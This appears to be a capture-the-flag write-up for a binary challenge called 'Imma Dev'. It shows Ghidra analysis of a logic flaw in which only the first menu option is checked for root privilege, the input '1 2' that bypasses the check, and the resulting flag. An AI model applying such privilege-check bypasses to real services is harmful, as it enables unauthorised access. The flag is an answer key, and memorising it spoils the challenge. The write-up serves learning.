# Imma Dev

## Solution:

- Testing what happens when we first connect locally\
```
aditya@LAPTOP-FKJS79ON:/mnt/c/users/aditya/desktop/Custom_c/binary exploitation/imma_dev/src$ nc localhost 5151
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1
Input your name: aditya
Hi aditya
```
```
2
Error: Option 2 requires root privileges HAHA
```
```
3
Input Username:
admin
Enter Password:
admin
lmeow i forgot to make the db
```

- From this we understand that nothing much can be done here so we need to open the binary in Ghidra
- We see a few functions `handleOption` `login` `main` `printFlag` `sayHello`
- The function `handleOption()` contains a Logic Flaw
- This function checked the first number provided in the input string `local_428[0]` is 2 to restrict access
```
if ((local_428[0] == 2) && (_Var3 = geteuid(), _Var3 != 0))
```
- `for` loop is used to iterate through every number in the input list `local_428` executing the corresponding function for each one
```
for (local_5cc = 0; local_5cc < local_5d0; local_5cc = local_5cc + 1) {
  iVar1 = local_428[local_5cc];
}
```

- To get the flag we must enter `1 2`
- 1 to use `sayhello` function and 2 will use the `printflag()`
- now connecting to netcat and getting the flag
```
aditya@LAPTOP-FKJS79ON:/mnt/c/users/aditya/desktop/Custom_c/binary exploitation/imma_dev/src$ nc immadeveloper.nitephase.live 61234
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: aditya
Hi aditya
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

Flag: 
```
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

## Concepts learnt:

- Learned how to navigate and analyze decompiled code using Ghidra.

- Learned how to identify logical flaws in a program and exploit them.

## Notes:

At first it seemed like a stack overflow problem but apparently it was something different this time


